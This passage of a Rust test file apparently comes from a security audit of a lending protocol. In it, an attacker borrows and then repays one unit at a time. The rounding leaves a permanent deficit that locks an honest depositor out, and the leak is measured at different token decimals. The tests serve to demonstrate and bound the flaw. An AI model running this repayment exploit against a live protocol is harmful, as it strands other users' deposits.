    /// only accrues while there are borrows. If the attacker is the only
    /// borrower and repays their loan down to zero, utilization goes to zero,
    /// nothing accrues, and the shortfall never heals.
    #[test]
    fn t14_zero_utilization_makes_it_permanent() {
        let mut f = Fixture::setup();
        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0)); // honest depositor

        assert!(f.action_withdraw(0, 60, 1, 0)); // attacker borrows 60 units
        let mut paid = 0;
        while user_token(&f, 0, 1) < 0 {
            assert!(f.action_deposit(0, 1, 1, 1));
            paid += 1;
            assert!(paid < 100);
        }
        let sm = f.read_spot_market_1().unwrap();
        println!(
            "borrowed 60, repaid {paid}; borrow_balance={} deficit={}",
            sm.borrow_balance,
            deficit(&f, 1)
        );
        assert_eq!(sm.borrow_balance, 0, "utilization is now zero");
        assert!(deficit(&f, 1) > 0);

        // Let a lot of time pass and crank interest repeatedly. With no borrows
        // there is nothing to accrue, so nothing heals.
        for _ in 0..10 {
            assert!(f.action_warp(2_000_000, 1)); // ~9 days each
            let _ = crank_interest_1(&mut f);
        }
        println!("after ~90 days: deficit={}", deficit(&f, 1));
        assert!(
            deficit(&f, 1) > 0,
            "the shortfall is permanent at zero utilization"
        );

        // The honest depositor is locked out of their entire 500-unit deposit.
        let code = withdraw_code(&mut f, 1, 1, 1);
        println!("user1 withdraw 1 unit -> {:?}", code);
        assert_eq!(code, Some(6173));
        let code = withdraw_code(&mut f, 1, 100 * BASE_PRECISION_U64, 1);
        println!("user1 withdraw 100.0 -> {:?}", code);
        assert_eq!(code, Some(6173));
    }

    /// Bound the finding by decimals. The leak needs one scaled-balance unit to
    /// be worth at least one token unit, i.e. cumulative_borrow_interest >=
    /// 10^(19 - decimals). At the fresh value 1e10 that means decimals >= 9.
    /// Re-configure market 1 at genesis with 8 decimals and re-run the attack.
    #[test]
    fn t9_eight_decimals_leaks_ten_times_slower() {
        let mut f = Fixture::setup();
        let mut sm = f.read_spot_market_1().unwrap();
        assert_eq!(sm.deposit_balance, 0);
        assert_eq!(sm.borrow_balance, 0);
        sm.decimals = 8;
        inject(&mut f.ctx, f.spot_market_1_pda, &mut sm);

        assert!(f.action_deposit(0, 500_000 * QUOTE_PRECISION as u64, 0, 0));
        assert!(f.action_deposit(1, 500 * BASE_PRECISION_U64, 1, 0));
        assert!(f.action_withdraw(0, 100 * BASE_PRECISION_U64, 1, 0));
        let d0 = deficit(&f, 1);
        for _ in 0..30 {
            assert!(f.action_deposit(0, 1, 1, 1));
        }
        let d1 = deficit(&f, 1);
        println!(
            "8 decimals: deficit {d0} -> {d1} after 30 repays; solvent={}",
            solvent(&f, 1)
        );
        // ~0.1 token units per repay: one scaled-balance unit is worth
        // cumulative_borrow_interest / 10^(19-decimals) = 1e10/1e11 = 0.1 tokens.
        assert!(d1 > d0, "8-decimal market leaks too, just 10x slower");
        assert!(d1 - d0 <= 5, "and at roughly a tenth of the 9-decimal rate");
    }
}
